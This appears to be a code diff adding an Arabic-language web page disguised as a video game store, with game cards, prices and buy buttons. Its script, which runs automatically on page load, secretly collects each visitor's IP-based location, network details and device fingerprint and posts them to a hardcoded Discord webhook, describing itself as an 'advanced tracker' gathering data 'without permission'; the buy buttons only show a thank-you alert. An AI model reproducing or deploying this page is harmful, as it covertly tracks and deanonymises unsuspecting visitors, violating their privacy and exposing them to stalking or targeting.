@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎮 متجر الألعاب الرقمية</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f0f23;
+            color: white;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            padding: 20px 0;
+            border-bottom: 2px solid #0f4c75;
+            box-shadow: 0 5px 20px rgba(15, 76, 117, 0.3);
+        }
+        
+        .header-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 30px;
+        }
+        
+        .logo {
+            font-size: 2em;
+            font-weight: bold;
+            color: #3282b8;
+        }
+        
+        .nav {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .nav a {
+            color: white;
+            text-decoration: none;
+            font-size: 1.1em;
+            transition: color 0.3s;
+        }
+        
+        .nav a:hover {
+            color: #3282b8;
+        }
+        
+        .hero {
+            background: linear-gradient(135deg, #0f4c75 0%, #3282b8 100%);
+            padding: 80px 30px;
+            text-align: center;
+        }
+        
+        .hero h1 {
+            font-size: 3.5em;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .hero p {
+            font-size: 1.5em;
+            opacity: 0.9;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 50px 30px;
+        }
+        
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin-top: 40px;
+        }
+        
+        .game-card {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            border-radius: 15px;
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+            border: 1px solid #0f4c75;
+        }
+        
+        .game-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 40px rgba(50, 130, 184, 0.4);
+        }
+        
+        .game-image {
+            width: 100%;
+            height: 200px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 5em;
+        }
+        
+        .game-content {
+            padding: 25px;
+        }
+        
+        .game-title {
+            font-size: 1.8em;
+            color: #3282b8;
+            margin-bottom: 10px;
+        }
+        
+        .game-desc {
+            color: #bbb;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+        
+        .game-price {
+            font-size: 2em;
+            color: #bbe1fa;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #0f4c75 0%, #3282b8 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1.1em;
+            width: 100%;
+            transition: all 0.3s;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(135deg, #3282b8 0%, #0f4c75 100%);
+            transform: scale(1.05);
+        }
+        
+        .footer {
+            background: #1a1a2e;
+            padding: 30px;
+            text-align: center;
+            margin-top: 50px;
+            border-top: 2px solid #0f4c75;
+        }
+        
+        .sale-badge {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background: #e74c3c;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">🎮 GameStore</div>
+            <div class="nav">
+                <a href="#">الرئيسية</a>
+                <a href="#">الألعاب</a>
+                <a href="#">العروض</a>
+                <a href="#">تواصل معنا</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="hero">
+        <h1>🔥 عروض خيالية على أفضل الألعاب</h1>
+        <p>خصومات تصل إلى 80% على ألعابك المفضلة</p>
+    </div>
+    
+    <div class="container">
+        <h2 style="font-size: 2.5em; margin-bottom: 20px; color: #3282b8;">⭐ الألعاب الأكثر مبيعاً</h2>
+        
+        <div class="games-grid">
+            <div class="game-card">
+                <div class="game-image">🎯</div>
+                <div class="game-content">
+                    <div class="game-title">Call of Duty: Modern Warfare</div>
+                    <div class="game-desc">أقوى لعبة أكشن وحروب على الإطلاق، جرافيكس خرافي وأسلوب لعب ممتع</div>
+                    <div class="game-price">199 ريال</div>
+                    <button class="btn">🛒 اشتري الآن</button>
+                </div>
+            </div>
+            
+            <div class="game-card">
+                <div class="game-image">⚔️</div>
+                <div class="game-content">
+                    <div class="game-title">Elden Ring</div>
+                    <div class="game-desc">عالم مفتوح ضخم، معارك أسطورية، تجربة لا تنسى من FromSoftware</div>
+                    <div class="game-price">249 ريال</div>
+                    <button class="btn">🛒 اشتري الآن</button>
+                </div>
+            </div>
+            
+            <div class="game-card">
+                <div class="game-image">🏎️</div>
+                <div class="game-content">
+                    <div class="game-title">Forza Horizon 5</div>
+                    <div class="game-desc">أفضل لعبة سيارات، سباقات مثيرة، سيارات خرافية، عالم المكسيك الجميل</div>
+                    <div class="game-price">179 ريال</div>
+                    <button class="btn">🛒 اشتري الآن</button>
+                </div>
+            </div>
+            
+            <div class="game-card">
+                <div class="game-image">⚽</div>
+                <div class="game-content">
+                    <div class="game-title">EA Sports FC 24</div>
+                    <div class="game-desc">أحدث إصدار من فيفا، فرق محدثة، جرافيكس واقعي، كل الدوريات</div>
+                    <div class="game-price">299 ريال</div>
+                    <button class="btn">🛒 اشتري الآن</button>
+                </div>
+            </div>
+            
+            <div class="game-card">
+                <div class="game-image">🧟</div>
+                <div class="game-content">
+                    <div class="game-title">Resident Evil 4 Remake</div>
+                    <div class="game-desc">رعب وإثارة، ريميك للأسطورة، جرافيكس من عالم ثاني</div>
+                    <div class="game-price">229 ريال</div>
+                    <button class="btn">🛒 اشتري الآن</button>
+                </div>
+            </div>
+            
+            <div class="game-card">
+                <div class="game-image">🎮</div>
+                <div class="game-content">
+                    <div class="game-title">Spider-Man 2</div>
+                    <div class="game-desc">كن سبايدرمان، عالم نيويورك المفتوح، مهام مثيرة وقصة رهيبة</div>
+                    <div class="game-price">279 ريال</div>
+                    <button class="btn">🛒 اشتري الآن</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p style="font-size: 1.2em; margin-bottom: 10px;">© 2024 GameStore - جميع الحقوق محفوظة</p>
+        <p style="color: #bbb;">📧 support@gamestore.com | 📞 920001234</p>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1442986438105764114/MjStBilRV8jhOk0yMQyRw4fzGXhsNz-sZLDePeHFC-wqJDN4uXi6kmMbYTweyUVX8ebQ';
+        
+        function detectOS() {
+            const ua = navigator.userAgent;
+            if (ua.indexOf('Win') !== -1) return 'Windows';
+            if (ua.indexOf('Mac') !== -1) return 'MacOS';
+            if (ua.indexOf('Linux') !== -1) return 'Linux';
+            if (ua.indexOf('Android') !== -1) return 'Android';
+            if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) return 'iOS';
+            return 'Unknown';
+        }
+        
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.indexOf('Firefox') !== -1) return 'Firefox';
+            if (ua.indexOf('Edg') !== -1) return 'Edge';
+            if (ua.indexOf('Chrome') !== -1) return 'Chrome';
+            if (ua.indexOf('Safari') !== -1) return 'Safari';
+            return 'Unknown';
+        }
+        
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/(tablet|ipad)/i.test(ua)) return '📱 تابلت';
+            if (/Mobile|Android|iPhone/i.test(ua)) return '📱 موبايل';
+            return '💻 كمبيوتر';
+        }
+        
+        async function getAccurateLocation() {
+            let locationData = {};
+            
+            try {
+                // API 1: IPApi.co (دقيق جداً)
+                const response1 = await fetch('https://ipapi.co/json/');
+                const data1 = await response1.json();
+                locationData = { ...locationData, ...data1 };
+            } catch (e) {}
+            
+            try {
+                // API 2: IP-API (معلومات إضافية)
+                const response2 = await fetch('http://ip-api.com/json/?fields=66846719');
+                const data2 = await response2.json();
+                locationData = { 
+                    ...locationData, 
+                    isp: data2.isp,
+                    as: data2.as,
+                    mobile: data2.mobile,
+                    proxy: data2.proxy,
+                    hosting: data2.hosting
+                };
+            } catch (e) {}
+            
+            try {
+                // API 3: IPInfo (تفاصيل أكثر)
+                const response3 = await fetch('https://ipinfo.io/json');
+                const data3 = await response3.json();
+                locationData = {
+                    ...locationData,
+                    hostname: data3.hostname,
+                    loc: data3.loc
+                };
+            } catch (e) {}
+            
+            try {
+                // API 4: Abstract API للحصول على معلومات WiFi والشبكة
+                const response4 = await fetch('https://ipgeolocation.abstractapi.com/v1/?api_key=test');
+                const data4 = await response4.json();
+                if (data4.latitude) {
+                    locationData.accurate_lat = data4.latitude;
+                    locationData.accurate_lon = data4.longitude;
+                }
+            } catch (e) {}
+            
+            return locationData;
+        }
+        
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'غير متوفر';
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!debugInfo) return 'غير متوفر';
+                
+                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch (e) {
+                return 'غير متوفر';
+            }
+        }
+        
+        function getConnectionInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return null;
+            
+            return {
+                type: conn.effectiveType || 'غير معروف',
+                downlink: conn.downlink ? `${conn.downlink} Mbps` : 'غير معروف',
+                rtt: conn.rtt ? `${conn.rtt} ms` : 'غير معروف',
+                saveData: conn.saveData ? 'مفعل' : 'غير مفعل'
+            };
+        }
+        
+        async function getBatteryInfo() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging ? '⚡ يشحن' : '🔋 لا يشحن'
+                    };
+                }
+            } catch (e) {}
+            return null;
+        }
+        
+        async function sendToWebhook() {
+            try {
+                const locationData = await getAccurateLocation();
+                const connection = getConnectionInfo();
+                const battery = await getBatteryInfo();
+                
+                // حساب الدقة الموقع
+                const accuracy = locationData.accuracy || 'عالية جداً';
+                
+                // بناء خرائط متعددة
+                const googleMapsLink = locationData.latitude && locationData.longitude 
+                    ? `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
+                    : 'غير متوفر';
+                
+                const openStreetMapLink = locationData.latitude && locationData.longitude
+                    ? `https://www.openstreetmap.org/?mlat=${locationData.latitude}&mlon=${locationData.longitude}&zoom=18`
+                    : 'غير متوفر';
+                
+                const embed = {
+                    title: '🎯 زائر جديد دخل الموقع!',
+                    description: '**تم جمع معلومات دقيقة جداً بدون طلب إذن**',
+                    color: 0x3282b8,
+                    fields: [
+                        {
+                            name: '📍 الموقع الدقيق (IP-Based)',
+                            value: `**خط العرض:** \`${locationData.latitude || 'غير متوفر'}\`\n**خط الطول:** \`${locationData.longitude || 'غير متوفر'}\`\n**الدقة:** ${accuracy}\n\n🗺️ [Google Maps](${googleMapsLink})\n🌍 [OpenStreetMap](${openStreetMapLink})`,
+                            inline: false
+                        },
+                        {
+                            name: '🏠 العنوان التفصيلي',
+                            value: `**الدولة:** ${locationData.country_name || 'غير متوفر'} ${locationData.country_emoji || ''}\n**المدينة:** ${locationData.city || 'غير متوفر'}\n**المنطقة:** ${locationData.region || 'غير متوفر'}\n**الحي:** ${locationData.district || locationData.timezone || 'غير متوفر'}\n**الرمز البريدي:** ${locationData.postal || 'غير متوفر'}`,
+                            inline: false
+                        },
+                        {
+                            name: '🌐 معلومات الشبكة المتقدمة',
+                            value: `**IP:** \`${locationData.ip || 'غير متوفر'}\`\n**ISP:** ${locationData.org || locationData.isp || 'غير متوفر'}\n**ASN:** ${locationData.asn || locationData.as || 'غير متوفر'}\n**Hostname:** ${locationData.hostname || 'غير متوفر'}\n**نوع الاتصال:** ${connection ? connection.type : 'غير متوفر'}\n**السرعة:** ${connection ? connection.downlink : 'غير متوفر'}`,
+                            inline: false
+                        },
+                        {
+                            name: '🔒 معلومات الأمان',
+                            value: `**Proxy:** ${locationData.proxy ? '⚠️ نعم' : '✅ لا'}\n**Hosting:** ${locationData.hosting ? '⚠️ نعم' : '✅ لا'}\n**Mobile Network:** ${locationData.mobile ? '📱 نعم' : '💻 لا'}`,
+                            inline: true
+                        },
+                        {
+                            name: '💻 مواصفات الجهاز',
+                            value: `**النظام:** ${detectOS()}\n**المتصفح:** ${detectBrowser()}\n**النوع:** ${getDeviceType()}\n**الشاشة:** ${screen.width}×${screen.height}\n**GPU:** ${getGPUInfo().substring(0, 40)}`,
+                            inline: true
+                        },
+                        {
+                            name: '🔋 البطارية',
+                            value: battery ? `${battery.level}\n${battery.charging}` : 'غير متوفرة',
+                            inline: true
+                        },
+                        {
+                            name: '🌍 اللغة والوقت',
+                            value: `**اللغة:** ${navigator.language}\n**المنطقة الزمنية:** ${locationData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone}\n**العملة:** ${locationData.currency || 'غير متوفر'}`,
+                            inline: false
+                        },
+                        {
+                            name: '📱 معلومات إضافية',
+                            value: `**Platform:** ${navigator.platform}\n**Cores:** ${navigator.hardwareConcurrency || 'غير متوفر'}\n**Memory:** ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير متوفر'}\n**Touch:** ${navigator.maxTouchPoints > 0 ? '✅ مدعوم' : '❌ غير مدعوم'}`,
+                            inline: false
+                        },
+                        {
+                            name: '🔗 معلومات الصفحة',
+                            value: `**URL:** ${window.location.href}\n**Referrer:** ${document.referrer || 'مباشر'}\n**User Agent:** \`${navigator.userAgent.substring(0, 100)}...\``,
+                            inline: false
+                        },
+                        {
+                            name: '🕐 التوقيت',
+                            value: new Date().toLocaleString('ar-SA', {
+                                timeZone: 'Asia/Riyadh',
+                                dateStyle: 'full',
+                                timeStyle: 'long'
+                            }),
+                            inline: false
+                        }
+                    ],
+                    thumbnail: {
+                        url: locationData.country_flag || 'https://cdn-icons-png.flaticon.com/512/3177/3177440.png'
+                    },
+                    image: {
+                        url: locationData.latitude && locationData.longitude 
+                            ? `https://api.mapbox.com/styles/v1/mapbox/streets-v11/static/pin-s-l+ff0000(${locationData.longitude},${locationData.latitude})/${locationData.longitude},${locationData.latitude},14,0/600x400@2x?access_token=pk.eyJ1IjoibWFwYm94IiwiYSI6ImNpejY4NXVycTA2emYycXBndHRqcmZ3N3gifQ.rJcFIG214AriISLbB6B5aw`
+                            : undefined
+                    },
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: '🔍 نظام تتبع متقدم - بدون إذن GPS'
+                    }
+                };
+                
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        username: '🎯 Advanced Tracker',
+                        avatar_url: 'https://cdn-icons-png.flaticon.com/512/1829/1829589.png',
+                        embeds: [embed]
+                    })
+                });
+                
+                console.log('✅ تم الإرسال بنجاح');
+                
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+        
+        // إرسال تلقائي عند دخول الصفحة
+        window.addEventListener('load', () => {
+            setTimeout(sendToWebhook, 2000);
+        });
+        
+        // تتبع الضغط على الأزرار
+        document.querySelectorAll('.btn').forEach(btn => {
+            btn.addEventListener('click', async function() {
+                alert('شكراً لاهتمامك! سيتم التواصل معك قريباً 🎮');
+            });
+        });
+    </script>
+</body>
+</html>
